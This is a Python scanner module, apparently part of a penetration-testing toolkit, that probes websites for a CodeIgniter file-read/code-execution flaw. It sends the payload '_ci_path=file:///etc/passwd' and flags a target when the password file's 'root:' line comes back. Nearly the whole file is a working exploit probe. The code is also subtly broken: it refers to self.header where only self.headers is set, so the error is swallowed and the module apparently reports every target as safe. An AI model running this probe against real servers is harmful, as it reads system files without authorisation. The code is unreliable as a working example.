#! /usr/bin/python3
# -*- encoding: utf-8 -*-
from libs.outprint import OutPrintInfo,OutPrintInfoSuc
from libs.reqset import ReqSet
import requests,urllib3
from libs.output import OutPutFile
urllib3.disable_warnings()
class CodeIgniter_Rce_Scan:
    def send_payload(self,url):
        data = "_ci_path=file:///etc/passwd"
        try:
            req = requests.post(url, timeout=3,verify=self.verify,proxies=self.proxy,headers=self.header,data=data)
            if "root:" in req.text:
                OutPrintInfoSuc("CodeIgniter", f"存在CodeIgniter任意代码执行漏洞{url}")

                if not self.batch:
                    OutPrintInfo("CodeIgniter", f"Data: \n{data}")
                else:
                    OutPutFile("codeigniter_rce.txt",f"存在CodeIgniter任意代码执行漏洞{url}")
            else:
                if not self.batch:
                    OutPrintInfo("CodeIgniter", f"不存在CodeIgniter任意代码执行漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("CodeIgniter", "不存在CodeIgniter任意代码执行漏洞")

    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        if not self.batch:
            req = ReqSet(header=header, proxy=proxy)
            self.proxy = req["proxy"]
            self.headers = req["header"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
            req = ReqSet(header=header)
            self.headers = req["header"]
        if not self.batch:
            OutPrintInfo("CodeIgniter", "开始检测CodeIgniter任意代码执行漏洞...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("CodeIgniter", "CodeIgniter任意代码执行漏洞检测结束")